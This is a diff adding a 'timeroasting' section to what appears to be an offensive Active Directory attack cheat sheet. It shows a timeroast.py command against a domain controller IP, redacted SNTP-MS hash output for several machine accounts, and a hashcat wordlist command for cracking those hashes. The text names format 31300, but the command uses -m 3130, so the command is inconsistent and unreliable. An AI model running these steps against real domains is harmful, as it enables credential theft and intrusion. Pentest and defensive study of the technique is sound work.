@@ -1032,6 +1032,33 @@ On domain controller (up to Windows Server 2019) if you create a computer accoun
 
 <img src="./images/timeroasting.png" width="700"/>
 
+```
+python3 timeroast.py 192.168.2.60 -o ntp_hashes
+
+1002:$sntp-ms$3axxxxxxx3$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx038
+1116:$sntp-ms$11xxxxxxx2$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx73e
+1119:$sntp-ms$e9xxxxxxxb$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxcfa
+1117:$sntp-ms$30xxxxxxx5$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx2d3
+1127:$sntp-ms$71xxxxxxx7$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx663
+1128:$sntp-ms$51xxxxxxxd$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx9f6
+1129:$sntp-ms$08xxxxxxxf$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxdd4
+1131:$sntp-ms$d5xxxxxxxc$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx41e
+1137:$sntp-ms$13xxxxxxxe$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxb80
+1138:$sntp-ms$9exxxxxxx0$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxx767
+1139:$sntp-ms$bbxxxxxxxc$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxea2
+1140:$sntp-ms$9axxxxxxx5$1c04xxxxxxxxxxxxxxxxxxxxxxxxxxxxe01
+```
+
+**Cracking NTP Hashes**
+- https://github.com/hashcat/hashcat/issues/3629
+- https://github.com/hashcat/hashcat/commit/5446570a4fe7fbadc0bb481f41616e76833da735
+
+Format 31300 (SNTP-MS) available to hashcat to crack the NTP hashes.
+
+```
+hashcat -a 0 -m 3130 ntp_hashes ./wordlists/rockyou.txt
+```
+
 ### MS14-066
 
 
